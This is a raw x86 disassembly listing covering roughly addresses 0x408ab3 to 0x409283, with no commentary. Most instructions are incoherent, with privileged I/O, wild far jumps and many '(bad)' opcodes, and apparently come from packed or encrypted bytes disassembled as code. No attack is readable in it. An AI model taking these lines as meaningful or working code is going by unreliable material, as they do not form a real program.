  408ab3:	ficom  WORD PTR [edi+0x754d1bb2]
  408ab9:	dec    ebx
  408aba:	sar    BYTE PTR [ebp-0x17858bfc],cl
  408ac0:	test   ebp,edi
  408ac2:	das    
  408ac3:	xchg   ebx,eax
  408ac4:	mov    bl,0xe1
  408ac6:	hlt    
  408ac7:	sahf   
  408ac8:	push   ebx
  408ac9:	out    dx,al
  408aca:	or     cl,BYTE PTR [ebx-0x58e6f1bd]
  408ad0:	mov    DWORD PTR [ebx-0x63],ecx
  408ad3:	(bad)  
  408ad4:	jge    0x408a9b
  408ad6:	cmp    eax,0xb814982b
  408adb:	mov    eax,edi
  408add:	icebp  
  408ade:	arpl   WORD PTR [ecx+0x4515f8be],dx
  408ae4:	dec    ebx
  408ae5:	aam    0xd3
  408ae7:	mov    WORD PTR [ebx-0x69e78e],?
  408aed:	mov    al,0xf1
  408aef:	mov    DWORD PTR [edi-0x1898ffc5],esi
  408af5:	mov    eax,ds:0x7c4736fe
  408afa:	inc    ebp
  408afb:	jge    0x408b28
  408afd:	outs   dx,DWORD PTR ds:[esi]
  408afe:	gs and al,0x3a
  408b01:	icebp  
  408b02:	pop    eax
  408b03:	sub    dh,cl
  408b05:	mov    ds:0xe91e7829,eax
  408b0a:	adc    ebx,eax
  408b0c:	out    dx,al
  408b0d:	push   cs
  408b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b0f:	cld    
  408b10:	clc    
  408b11:	sub    BYTE PTR ds:[edi+0x5cd0ccbf],0x8d
  408b19:	scas   eax,DWORD PTR es:[edi]
  408b1a:	mov    ds:0xa6c9b335,al
  408b1f:	nop
  408b20:	fisttp QWORD PTR [esi+0x6b]
  408b23:	inc    esi
  408b24:	adc    al,0x58
  408b26:	push   eax
  408b27:	mov    esp,0xfd50027
  408b2c:	fistp  WORD PTR [ecx+0x6e09786b]
  408b32:	dec    edx
  408b33:	ins    BYTE PTR es:[edi],dx
  408b34:	mov    ch,0x40
  408b36:	fidiv  WORD PTR ds:0xc07a43de
  408b3c:	jns    0x408b52
  408b3e:	jmp    0x2204b43a
  408b43:	xchg   esi,eax
  408b44:	out    dx,eax
  408b45:	ds ja  0x408b9b
  408b48:	fdivrp st(7),st
  408b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b4b:	shl    eax,0x46
  408b4e:	rcr    DWORD PTR [ecx],1
  408b50:	mov    bh,0x2f
  408b52:	loopne 0x408b57
  408b54:	je     0x408bc9
  408b56:	test   BYTE PTR [ebx-0x9a14ec2],cl
  408b5c:	add    DWORD PTR [ebx],esp
  408b5e:	pop    edi
  408b5f:	rcl    DWORD PTR [edx],0x51
  408b62:	xchg   ecx,eax
  408b63:	add    eax,0xbc000429
  408b68:	pop    esp
  408b69:	sbb    BYTE PTR [ecx+0x47],ah
  408b6c:	ret    0xabf7
  408b6f:	into   
  408b70:	xlat   BYTE PTR ds:[ebx]
  408b71:	adc    al,0x96
  408b73:	add    esp,ebx
  408b75:	jmp    0xde05f4d2
  408b7a:	clc    
  408b7b:	and    BYTE PTR [ebx],0x9f
  408b7e:	or     eax,0x6970138e
  408b83:	mov    edi,eax
  408b85:	js     0x408b9c
  408b87:	not    DWORD PTR [ebx+0x7aeed724]
  408b8d:	in     al,dx
  408b8e:	mov    ecx,DWORD PTR [edx-0xd]
  408b91:	jae    0x408b5a
  408b93:	mov    BYTE PTR es:[edx-0x2bdf673a],al
  408b9a:	xacquire xchg DWORD PTR [edx-0x6d963475],edi
  408ba1:	inc    esi
  408ba2:	pop    ebp
  408ba3:	cld    
  408ba4:	mov    ecx,0x24890ae7
  408ba9:	fmul   QWORD PTR [edi+0x37]
  408bac:	sub    BYTE PTR ss:[edx+0x10],0x76
  408bb1:	push   ebx
  408bb2:	idiv   BYTE PTR [ebx+edi*4+0x7b24eda8]
  408bb9:	aas    
  408bba:	dec    eax
  408bbb:	rol    DWORD PTR [ebx-0xe],0x11
  408bbf:	leave  
  408bc0:	push   ebx
  408bc1:	retf   0x43ee
  408bc4:	add    ebx,ecx
  408bc6:	push   0x9d1f6d66
  408bcb:	jbe    0x408c14
  408bcd:	icebp  
  408bce:	push   0x74
  408bd0:	sbb    ch,BYTE PTR [ebp+0x1a]
  408bd3:	inc    esi
  408bd4:	push   eax
  408bd5:	mov    ds:0x2108448b,eax
  408bda:	(bad)
  408bde:	es sbb edi,ebx
  408be1:	or     eax,DWORD PTR [edi+0x23f4a21b]
  408be7:	jo     0x408c4b
  408be9:	lahf   
  408bea:	ins    DWORD PTR es:[edi],dx
  408beb:	adc    DWORD PTR [ebp+edi*1-0x5a1b0cf7],edx
  408bf2:	mov    al,0xd2
  408bf4:	std    
  408bf5:	inc    esi
  408bf6:	mov    bl,0x96
  408bf8:	dec    edx
  408bf9:	mov    esi,0x45c5bfe2
  408bfe:	lods   eax,DWORD PTR ds:[esi]
  408bff:	popa   
  408c00:	pop    esp
  408c01:	fidiv  DWORD PTR [edx-0x61]
  408c04:	dec    ecx
  408c05:	in     eax,dx
  408c06:	add    edi,eax
  408c08:	popf   
  408c09:	ins    DWORD PTR es:[edi],dx
  408c0a:	adc    eax,0xdce60e79
  408c0f:	pop    esi
  408c10:	sub    eax,0x56191293
  408c15:	sub    DWORD PTR [ebx],edi
  408c17:	sub    eax,0x117d3f90
  408c1c:	dec    ecx
  408c1d:	and    edi,DWORD PTR [ebx]
  408c1f:	push   0x3b
  408c21:	mov    al,0x49
  408c23:	or     BYTE PTR [edi],0x5
  408c26:	pop    ds
  408c27:	out    dx,eax
  408c28:	rol    DWORD PTR [ecx-0x21c09163],0x0
  408c2f:	mov    eax,ds:0xafcecb25
  408c34:	stc    
  408c35:	sbb    edi,DWORD PTR es:[edx+0x4c]
  408c39:	and    ch,BYTE PTR [ebp+0xc]
  408c3c:	or     bh,BYTE PTR [ebp+0x2f]
  408c3f:	pop    ds
  408c40:	xrelease mov BYTE PTR [esi-0x54c4cb0f],cl
  408c47:	pop    ecx
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  ebx,QWORD PTR [esi+0x47179e8b]
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c3b
  408c7d:	or     dh,cl
  408c7f:	xchg   ebp,eax
  408c80:	arpl   WORD PTR [ebx+0x51],di
  408c83:	cdq    
  408c84:	leave  
  408c85:	push   edi
  408c86:	jle    0x408c7b
  408c88:	add    al,0x4d
  408c8a:	mov    ds:0x99161eb8,al
  408c8f:	sub    BYTE PTR [edx-0x48],bl
  408c92:	xor    BYTE PTR ds:0xc1ee66ab,bl
  408c98:	dec    ecx
  408c99:	push   ds
  408c9a:	lods   al,BYTE PTR ds:[esi]
  408c9b:	frstor ds:0x298e2b84
  408ca1:	rcr    DWORD PTR [eax],0xcb
  408ca4:	fxch   st(4)
  408ca6:	inc    ecx
  408ca7:	mov    bh,0x26
  408ca9:	jl     0x408c38
  408cab:	and    eax,0xf0ccd232
  408cb0:	push   ds
  408cb1:	ss pop edi
  408cb3:	dec    ebp
  408cb4:	data16 jecxz 0x408cfe
  408cb7:	push   0x1cf82083
  408cbc:	test   eax,0xd9b2438f
  408cc1:	dec    ebx
  408cc2:	retf   0x3305
  408cc5:	mov    eax,ds:0x9197d6cf
  408cca:	in     eax,0x33
  408ccc:	xchg   edi,eax
  408ccd:	das    
  408cce:	aad    0x18
  408cd0:	dec    esp
  408cd1:	mov    cl,dh
  408cd3:	xchg   DWORD PTR [eax-0x42d64895],edi
  408cd9:	fadd   DWORD PTR [edx+edx*1-0x75]
  408cdd:	push   esp
  408cde:	aad    0x34
  408ce0:	and    al,0x22
  408ce2:	cmp    bh,BYTE PTR [ecx+esi*1]
  408ce5:	inc    edi
  408ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ce7:	push   ds
  408ce8:	push   edi
  408ce9:	add    ah,al
  408ceb:	das    
  408cec:	sbb    eax,0x3c52ca56
  408cf1:	xor    DWORD PTR [edx-0x1216aa16],edi
  408cf7:	stos   DWORD PTR es:[edi],eax
  408cf8:	aas    
  408cf9:	scas   eax,DWORD PTR es:[edi]
  408cfa:	ins    BYTE PTR es:[edi],dx
  408cfb:	mov    bh,0x65
  408cfd:	js     0x408d0a
  408cff:	arpl   WORD PTR [ecx-0x782729ee],bx
  408d05:	push   ecx
  408d06:	in     al,0x3f
  408d08:	push   esp
  408d09:	sub    al,0x0
  408d0b:	xchg   ebx,eax
  408d0c:	imul   DWORD PTR [edx-0x37]
  408d0f:	xchg   edx,eax
  408d10:	in     eax,dx
  408d11:	push   edi
  408d12:	call   0xc8c7375e
  408d17:	xor    eax,0x142c26f8
  408d1c:	mov    ds,esp
  408d1e:	or     cl,cl
  408d20:	popf   
  408d21:	retf   
  408d22:	pop    ecx
  408d23:	adc    BYTE PTR [esi-0x60],0xdf
  408d27:	je     0x408d7f
  408d29:	cmp    DWORD PTR [edx+0x1e59cf44],edi
  408d2f:	xchg   esp,eax
  408d30:	jge    0x408dab
  408d32:	adc    eax,0x2e0268c3
  408d37:	push   esp
  408d38:	fsubrp st(4),st
  408d3a:	cs in  al,dx
  408d3c:	pusha  
  408d3d:	or     ebx,DWORD PTR [edi]
  408d3f:	in     eax,0xdd
  408d41:	xchg   edx,eax
  408d42:	mov    cl,BYTE PTR [ecx]
  408d44:	dec    edi
  408d45:	inc    eax
  408d46:	mov    esp,DWORD PTR ds:0xfa2b7269
  408d4c:	(bad)  
  408d4e:	ret    0xd944
  408d51:	dec    eax
  408d52:	push   edx
  408d53:	push   edi
  408d54:	cmp    eax,0x80e6ae64
  408d59:	imul   ecx,ebx,0x7c
  408d5c:	test   edx,0xd7af1819
  408d62:	adc    BYTE PTR [edx+0x694a1fd5],cl
  408d68:	stos   BYTE PTR es:[edi],al
  408d69:	outs   dx,BYTE PTR ds:[esi]
  408d6a:	imul   edx,DWORD PTR [edi-0x3c1f63b4],0xffffffe7
  408d71:	dec    esi
  408d72:	imul   ecx,DWORD PTR [edx-0x11],0x93a740a4
  408d79:	cld    
  408d7a:	stos   DWORD PTR es:[edi],eax
  408d7b:	ins    BYTE PTR es:[edi],dx
  408d7c:	mov    cl,0x6
  408d7e:	test   eax,0xb8f698cc
  408d83:	jge    0x408d34
  408d85:	and    edx,esi
  408d87:	out    0x8a,al
  408d89:	arpl   WORD PTR [edx],si
  408d8b:	stos   DWORD PTR es:[edi],eax
  408d8c:	cmp    al,0xc7
  408d8e:	icebp  
  408d8f:	xchg   esp,eax
  408d90:	shr    BYTE PTR [edi+0x67d5a4ed],cl
  408d96:	mov    edi,0x77be6f22
  408d9b:	fiadd  DWORD PTR [eax+edx*1+0x50947850]
  408da2:	pop    ebx
  408da3:	or     bl,ah
  408da5:	mov    ?,WORD PTR [ebp+0x1a30c1fb]
  408dab:	stos   DWORD PTR es:[edi],eax
  408dac:	sub    eax,0x4a44320e
  408db1:	sbb    ah,BYTE PTR [ebp-0x6026edd]
  408db7:	mov    edi,0x2c703d85
  408dbc:	scas   al,BYTE PTR es:[edi]
  408dbd:	mov    es,edx
  408dbf:	stos   DWORD PTR es:[edi],eax
  408dc0:	mov    ah,0xb9
  408dc2:	movntq QWORD PTR [edi],mm1
  408dc5:	and    al,0x49
  408dc7:	shr    dh,cl
  408dc9:	and    DWORD PTR [ebp+0x2e0f28e3],ebx
  408dcf:	sbb    BYTE PTR gs:[ecx-0x79613e33],dh
  408dd6:	jmp    0x836e:0x862eab1d
  408ddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dde:	pop    ecx
  408ddf:	data16 mov dh,0xed
  408de2:	sbb    edi,esi
  408de4:	(bad)  
  408de5:	adc    cl,BYTE PTR [ebp-0x4b]
  408de8:	mov    eax,ds:0xffb9efa6
  408ded:	enter  0xd61a,0xad
  408df1:	inc    ebx
  408df2:	xor    ah,BYTE PTR [esi-0x47]
  408df5:	mov    edi,0x3edae05f
  408dfa:	scas   eax,DWORD PTR es:[edi]
  408dfb:	adc    BYTE PTR [ebx],al
  408dfd:	add    esp,DWORD PTR [edx*2+0x16779112]
  408e04:	cmp    BYTE PTR [eax-0x3f],dh
  408e07:	(bad)  [edi+0x68]
  408e0a:	xchg   esi,eax
  408e0b:	inc    eax
  408e0c:	and    BYTE PTR [eax+esi*1],0x2a
  408e10:	div    edx
  408e12:	sub    DWORD PTR [esi-0x646714ef],ebp
  408e18:	add    eax,0xd49fa6d7
  408e1d:	retf   0x3e7f
  408e20:	dec    ecx
  408e21:	sub    esp,ebx
  408e23:	adc    eax,0x4ee7b568
  408e28:	push   eax
  408e29:	hlt    
  408e2a:	sub    DWORD PTR [esi-0xe],esp
  408e2d:	jbe    0x408e7c
  408e2f:	jns    0x408df8
  408e31:	sbb    eax,0xe7c47c5a
  408e36:	loopne 0x408e80
  408e38:	lds    ebp,FWORD PTR [esi+0x12]
  408e3b:	in     eax,0xe3
  408e3d:	in     eax,0xb7
  408e3f:	aas    
  408e40:	add    esp,DWORD PTR [edi+0x2c]
  408e43:	retf   0x7d0f
  408e46:	lods   eax,DWORD PTR ds:[esi]
  408e47:	jmp    0x4ec38658
  408e4c:	push   edx
  408e4d:	call   0x206a227
  408e52:	cs call 0x2d880dee
  408e58:	mov    bh,0x4f
  408e5a:	imul   edx,DWORD PTR [ebx],0x7e0aca72
  408e60:	sbb    ebx,ecx
  408e62:	sub    dh,ah
  408e64:	mov    dh,0xb7
  408e66:	ret    
  408e67:	test   dh,0xa1
  408e6a:	or     esi,esi
  408e6c:	dec    esp
  408e6d:	mov    bh,0xd4
  408e6f:	push   0x5f
  408e71:	adc    eax,0xe1fe8a4c
  408e76:	data16 fidivr WORD PTR [eax+0x58]
  408e7a:	jne    0x408efb
  408e7c:	gs out 0xec,al
  408e7f:	popf   
  408e80:	fs pop esi
  408e82:	add    bl,BYTE PTR [ebp+0x2b]
  408e85:	aam    0x91
  408e87:	and    al,0x32
  408e89:	call   0xa70f1f3b
  408e8e:	dec    ebx
  408e8f:	xchg   edi,eax
  408e90:	test   al,0x6a
  408e92:	jo     0x408ee7
  408e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e95:	das    
  408e96:	pop    es
  408e97:	mov    ds:0x38bd1ba2,eax
  408e9c:	mov    cl,0x80
  408e9e:	aad    0x8c
  408ea0:	aas    
  408ea1:	lods   eax,DWORD PTR ds:[esi]
  408ea2:	fsubr  st(0),st
  408ea4:	pop    ecx
  408ea5:	ins    DWORD PTR es:[edi],dx
  408ea6:	cmc    
  408ea7:	jmp    0xfb25f1b7
  408eac:	hlt    
  408ead:	sbb    eax,0x9cf3893e
  408eb2:	loopne 0x408ecf
  408eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eb5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eb7:	das    
  408eb8:	outs   dx,BYTE PTR ds:[esi]
  408eb9:	jno    0x408e7d
  408ebb:	xchg   ebp,eax
  408ebc:	(bad)
  408ec0:	sub    DWORD PTR [ebp-0x32],edx
  408ec3:	push   0x72c5e496
  408ec8:	test   al,0xa
  408eca:	jmp    0x3bc532af
  408ecf:	xchg   ebp,eax
  408ed0:	pop    eax
  408ed1:	inc    eax
  408ed2:	dec    ebp
  408ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ed4:	pop    edx
  408ed5:	scas   eax,DWORD PTR es:[edi]
  408ed6:	xchg   ebx,eax
  408ed7:	fbld   TBYTE PTR [esi-0x76]
  408eda:	aaa    
  408edb:	ja     0x408f0f
  408edd:	adc    al,0x97
  408edf:	in     eax,0xc0
  408ee1:	addr16 pushf 
  408ee3:	int3   
  408ee4:	push   0x92e61a5f
  408ee9:	int    0x66
  408eeb:	sar    edx,cl
  408eed:	hlt    
  408eee:	sbb    al,0xa6
  408ef0:	or     edi,esp
  408ef2:	inc    ebp
  408ef3:	shl    DWORD PTR [edi+0x560ec36c],cl
  408ef9:	inc    esp
  408efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408efb:	push   esp
  408efc:	fcomp  DWORD PTR [ecx]
  408efe:	xor    eax,0xff0ad3a1
  408f03:	push   eax
  408f04:	mov    ecx,0x242c04b6
  408f09:	xor    edi,DWORD PTR [ebx+0x283cda36]
  408f0f:	dec    edi
  408f10:	jp     0x408f6a
  408f12:	adc    esi,DWORD PTR [ecx-0x3]
  408f15:	mov    edi,0x87684c8b
  408f1a:	clc    
  408f1b:	pop    ebp
  408f1c:	sbb    eax,0xcaa010e5
  408f21:	mov    ebp,0x466642d7
  408f26:	sub    BYTE PTR [ebp+ecx*8+0x3af5b1bb],ah
  408f2d:	repz push ss
  408f2f:	sti    
  408f30:	jecxz  0x408ee1
  408f32:	test   al,0x4b
  408f34:	cmp    edi,ecx
  408f36:	cs das 
  408f38:	hlt    
  408f39:	xchg   BYTE PTR [ebx],ah
  408f3b:	mov    ecx,0x584e5b00
  408f40:	xchg   ebp,eax
  408f41:	ja     0x408f24
  408f43:	sub    edi,ecx
  408f45:	sbb    eax,0x45bb7c47
  408f4a:	popa   
  408f4b:	or     ch,BYTE PTR [esi+0x6e]
  408f4e:	clc    
  408f4f:	cli    
  408f50:	into   
  408f51:	pop    ebp
  408f52:	pop    edx
  408f53:	push   ecx
  408f54:	inc    edi
  408f55:	jo     0x408f30
  408f57:	imul   edi,DWORD PTR [eax-0x526e9d88],0xa79f5a33
  408f61:	inc    esi
  408f62:	repnz or al,0xb8
  408f65:	mov    edx,0x9401b03a
  408f6a:	aam    0xab
  408f6c:	xchg   ebx,eax
  408f6d:	sbb    DWORD PTR [edx],0x35dd35b8
  408f73:	pop    ecx
  408f74:	out    dx,al
  408f75:	cdq    
  408f76:	pop    edx
  408f77:	xchg   ebx,eax
  408f78:	pop    edx
  408f79:	idiv   BYTE PTR [ebp*2+0x3c812f8b]
  408f80:	test   bh,bh
  408f82:	dec    esp
  408f83:	pop    ds
  408f84:	mov    ebp,0x25dad5cc
  408f89:	xor    DWORD PTR [eax],esp
  408f8b:	aas    
  408f8c:	xor    al,0xc
  408f8e:	add    eax,0x19f48051
  408f93:	repz ds mov ebx,0x56496f11
  408f9a:	xchg   DWORD PTR [esi-0x4e],edx
  408f9d:	(bad)  
  408f9e:	repz cmp BYTE PTR gs:[ebx+0x51],dl
  408fa3:	jnp    0x408f85
  408fa5:	out    0x31,al
  408fa7:	xchg   ebx,eax
  408fa8:	xchg   edx,eax
  408fa9:	xchg   DWORD PTR [ebx+ebp*2+0x58d30ff],edi
  408fb0:	sub    al,0xb0
  408fb2:	inc    ecx
  408fb3:	add    cl,ch
  408fb5:	dec    eax
  408fb6:	add    eax,DWORD PTR [eax]
  408fb8:	add    BYTE PTR [esp+edi*2],al
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x701937f3
  408fc6:	fs push 0x70e6775c
  408fcc:	jo     0x408fee
  408fce:	jge    0x409040
  408fd0:	jo     0x408f87
  408fd2:	mov    bl,0x1f
  408fd4:	out    dx,eax
  408fd5:	inc    ebx
  408fd6:	or     al,0xb1
  408fd8:	mov    eax,ds:0x6a4b935d
  408fdd:	push   ecx
  408fde:	mov    ecx,0xc8362642
  408fe3:	fidivr DWORD PTR [ecx-0x1499709a]
  408fe9:	imul   edx,edi,0xffffffd9
  408fec:	mov    bh,BYTE PTR [edx+eiz*1+0x1b]
  408ff0:	xchg   edx,eax
  408ff1:	ins    BYTE PTR es:[edi],dx
  408ff2:	pusha  
  408ff3:	xlat   BYTE PTR ds:[ebx]
  408ff4:	fiadd  DWORD PTR [ecx+ecx*4+0x326d56ed]
  408ffc:	into   
  408ffd:	push   esi
  408ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fff:	scas   al,BYTE PTR es:[edi]
  409000:	mov    cl,0xd2
  409002:	jge    0x408fca
  409004:	sub    BYTE PTR [eax+0x18],ch
  409007:	outs   dx,BYTE PTR ds:[esi]
  409008:	add    ch,bh
  40900a:	call   0xf1e8:0xcd893433
  409011:	daa    
  409012:	and    al,0x50
  409014:	stos   DWORD PTR es:[edi],eax
  409015:	jnp    0x408ff0
  409017:	(bad)  
  409018:	push   0x33
  40901a:	and    DWORD PTR [edx+0x65],ebx
  40901d:	out    0xf,eax
  40901f:	mov    BYTE PTR [ecx+0x66],al
  409022:	sbb    ebx,esi
  409024:	xchg   edi,eax
  409025:	fwait
  409026:	xor    eax,0x47e9d290
  40902b:	sti    
  40902c:	sbb    esi,DWORD PTR [esi]
  40902e:	push   ebp
  40902f:	fcom   DWORD PTR [ebx]
  409031:	sbb    al,0xb7
  409033:	std    
  409034:	xchg   edx,eax
  409035:	mov    eax,0xeef98158
  40903a:	(bad)  
  40903b:	xchg   ebp,eax
  40903c:	out    0x82,eax
  40903e:	cvtpi2ps xmm1,QWORD PTR [eax+edi*4+0x2a]
  409043:	dec    ebp
  409044:	inc    eax
  409045:	or     eax,0x5ebeefb4
  40904a:	pop    esi
  40904b:	(bad)  
  40904c:	cmp    BYTE PTR [ecx-0x51],dl
  40904f:	xor    ah,BYTE PTR [ecx+0x14]
  409052:	data16 test al,0xf4
  409055:	inc    edi
  409056:	enter  0x2c02,0x8c
  40905a:	mov    edx,0xac81a187
  40905f:	mov    eax,ds:0xc9b9d123
  409064:	rcl    al,1
  409066:	fstp   QWORD PTR [eax-0x5d]
  409069:	or     BYTE PTR [ecx+esi*2],ch
  40906c:	imul   edx,edi,0xffffffe7
  40906f:	cmp    ebx,ecx
  409071:	in     eax,0x46
  409073:	retf   0x3d9d
  409076:	xor    BYTE PTR [esi],0x88
  409079:	sub    eax,0x597c96f5
  40907e:	inc    edi
  40907f:	sbb    BYTE PTR [ebp-0x39],0x64
  409083:	add    BYTE PTR [ecx+0x60],0x82
  409087:	mov    ah,0x8f
  409089:	jno    0x409060
  40908b:	jge    0x409013
  40908d:	sub    ecx,esi
  40908f:	test   al,0x87
  409091:	outs   dx,DWORD PTR ds:[esi]
  409092:	and    DWORD PTR [edi-0x1712265d],eax
  409098:	push   ds
  409099:	xchg   edi,eax
  40909a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40909b:	add    BYTE PTR [eax+0x29a38f66],dl
  4090a1:	mov    ss,WORD PTR [ecx+0x61]
  4090a4:	(bad)  
  4090a5:	xchg   esi,eax
  4090a6:	pop    edi
  4090a7:	mov    esp,DWORD PTR [esi]
  4090a9:	aaa    
  4090aa:	sub    BYTE PTR [ebx+0x2d],al
  4090ad:	pop    ss
  4090ae:	(bad)  [edi]
  4090b0:	rcl    DWORD PTR [eiz*1-0x38ec4bae],1
  4090b7:	fisttp DWORD PTR [edx-0x6735f46d]
  4090bd:	push   ss
  4090be:	cmp    ebp,eax
  4090c0:	mov    esi,0xca5f6bfc
  4090c5:	imul   esp,DWORD PTR [edx],0xbe5ea70f
  4090cb:	(bad)  
  4090cc:	nop
  4090cd:	sub    eax,0x98d04612
  4090d2:	and    ah,bl
  4090d4:	ja     0x4090d6
  4090d6:	adc    WORD PTR [ecx+0x8],0xff9a
  4090db:	sbb    cl,0xb
  4090de:	std    
  4090df:	(bad)  
  4090e0:	(bad)  
  4090e1:	xor    al,0xd8
  4090e3:	(bad)  
  4090e4:	jne    0x40907c
  4090e6:	xchg   DWORD PTR [ecx],edi
  4090e8:	mov    al,ds:0x9cbfaa91
  4090ed:	test   eax,0x479b7dfc
  4090f2:	int    0x43
  4090f4:	push   es
  4090f5:	nop
  4090f6:	or     ah,BYTE PTR [edx-0x2b36b072]
  4090fc:	push   edi
  4090fd:	cdq    
  4090fe:	jae    0x4090be
  409100:	jae    0x4090d8
  409102:	call   0x938c:0xaefc06d2
  409109:	jecxz  0x409136
  40910b:	jg     0x409106
  40910d:	sahf   
  40910e:	inc    ecx
  40910f:	hlt    
  409110:	or     eax,0xf50a8fe5
  409115:	sar    DWORD PTR [esi-0x7a],cl
  409118:	scas   eax,DWORD PTR es:[edi]
  409119:	into   
  40911a:	inc    ecx
  40911b:	dec    ecx
  40911c:	or     bh,BYTE PTR [ebx+eiz*4-0x3c]
  409120:	inc    ecx
  409121:	mov    gs,WORD PTR ss:[edi-0x3d]
  409125:	xchg   esi,eax
  409126:	test   BYTE PTR [edi+edx*1],cl
  409129:	mov    cs,WORD PTR [ebx+0x217da8e2]
  40912f:	cmp    BYTE PTR [esi],dl
  409131:	fidivr DWORD PTR [esi]
  409133:	xor    eax,0x21df0eb
  409138:	cmc    
  409139:	out    dx,al
  40913a:	push   ecx
  40913b:	loope  0x409146
  40913d:	sbb    ebp,DWORD PTR [ecx+0x7e850652]
  409143:	mov    esi,0x6a35beea
  409148:	sbb    edi,DWORD PTR [ebp+0x726e2014]
  40914e:	ret    
  40914f:	stc    
  409150:	out    dx,eax
  409151:	mov    bl,BYTE PTR [esi-0x18]
  409154:	inc    ecx
  409155:	jne    0x4090fd
  409157:	jg     0x4090eb
  409159:	call   0xff67:0xb240dd56
  409160:	mov    ebx,0x42b57ea0
  409165:	push   esp
  409166:	or     dh,al
  409168:	mov    ah,0x4d
  40916a:	cs pop es
  40916c:	(bad)  
  40916d:	xor    ebp,DWORD PTR [ebx+0x5fe93398]
  409173:	adc    DWORD PTR [ebp+edi*4+0x32b7048d],0x3de8a14c
  40917e:	lea    ebx,[ecx]
  409180:	jg     0x40917e
  409182:	xchg   ebp,eax
  409183:	xor    al,BYTE PTR [esi]
  409185:	(bad)  
  409187:	or     dl,BYTE PTR [ecx+0x25cdcf69]
  40918d:	je     0x409112
  40918f:	jle    0x4091bd
  409191:	psadbw mm4,mm1
  409194:	mov    ah,0x61
  409196:	xlat   BYTE PTR ds:[ebx]
  409197:	dec    esi
  409198:	sti    
  409199:	pop    es
  40919a:	sahf   
  40919b:	(bad)  [ecx+0x24]
  40919e:	lds    esp,FWORD PTR [esi+0x5c]
  4091a1:	cmp    BYTE PTR [esp+ecx*1],dl
  4091a4:	cmp    eax,0xf843ae2a
  4091a9:	jae    0x409152
  4091ab:	cld    
  4091ac:	push   ecx
  4091ad:	sbb    al,0x27
  4091af:	mov    cl,0x94
  4091b1:	sbb    dh,BYTE PTR [edi-0x7b]
  4091b4:	into   
  4091b5:	cld    
  4091b6:	or     ebp,DWORD PTR [esi+0x1543e126]
  4091bc:	repz fbstp TBYTE PTR [edi-0x4ff517bc]
  4091c3:	jp     0x4091bb
  4091c5:	cdq    
  4091c6:	lds    ecx,FWORD PTR [ebx-0x7d361b28]
  4091cc:	xchg   edi,eax
  4091cd:	lock mov cl,0x8
  4091d0:	rcr    DWORD PTR [ebx-0x62f2baa0],cl
  4091d6:	ret    0xe7da
  4091d9:	ror    DWORD PTR [esi+0x72e3350d],1
  4091df:	inc    eax
  4091e0:	cwde   
  4091e1:	ds aad 0x51
  4091e4:	dec    ebx
  4091e5:	cld    
  4091e6:	pop    ebx
  4091e7:	daa    
  4091e8:	into   
  4091e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091ea:	xor    DWORD PTR [ecx+edi*2-0x564fff2f],ebp
  4091f1:	sti    
  4091f2:	add    BYTE PTR [edi-0x2eb4494e],ch
  4091f8:	lahf   
  4091f9:	ror    BYTE PTR [ebx+esi*4-0x21],0x4a
  4091fe:	jo     0x4091f8
  409200:	rcr    BYTE PTR [ecx],cl
  409202:	fwait
  409203:	jae    0x40920e
  409205:	scas   al,BYTE PTR es:[edi]
  409206:	xchg   ebx,eax
  409207:	or     ebp,DWORD PTR [edx+0x113a2b7b]
  40920d:	sbb    eax,esi
  40920f:	jbe    0x4091ba
  409211:	ja     0x409274
  409213:	mov    ecx,0x49412492
  409218:	add    DWORD PTR [esi],edi
  40921a:	aaa    
  40921b:	add    eax,0xf4ae6ab9
  409220:	loope  0x4091b1
  409222:	jno    0x40923f
  409224:	pusha  
  409225:	lea    edx,[edi]
  409227:	pop    ds
  409228:	adc    al,0x5b
  40922a:	popf   
  40922b:	xchg   ecx,eax
  40922c:	xor    bx,cx
  40922f:	ss scas eax,DWORD PTR es:[edi]
  409231:	bound  ebx,QWORD PTR [edi+0x69]
  409234:	xor    al,0xe4
  409236:	pushf  
  409237:	aad    0x54
  409239:	sbb    DWORD PTR [esi-0x2b],eax
  40923c:	inc    ebp
  40923d:	clc    
  40923e:	ror    BYTE PTR [edx],0x23
  409241:	mov    ds:0xbc840e4b,eax
  409246:	cmc    
  409247:	sbb    DWORD PTR [ecx-0x24],esi
  40924a:	lods   eax,DWORD PTR ds:[esi]
  40924b:	jecxz  0x409207
  40924d:	ret    0x7eff
  409250:	sub    ah,BYTE PTR [esi-0x4d1a9f36]
  409256:	cmp    DWORD PTR [edi+ecx*8-0x31c63b44],ebp
  40925d:	mul    DWORD PTR [ebx+0x24afe128]
  409263:	and    edx,DWORD PTR [eax]
  409265:	lock aad 0x91
  409268:	jge    0x409253
  40926a:	or     BYTE PTR [si],0xf
  40926e:	xlat   BYTE PTR ds:[ebx]
  40926f:	js     0x409274
  409271:	mov    dh,BYTE PTR [edx-0x68]
  409274:	push   ecx
  409275:	mov    eax,ds:0x2fb64ed2
  40927a:	jp     0x409218
  40927c:	das    
  40927d:	inc    edx
  40927e:	lock fucomip st,st(4)
  409281:	jg     0x409281
  409283:	add    BYTE PTR [edx-0x7c],dl
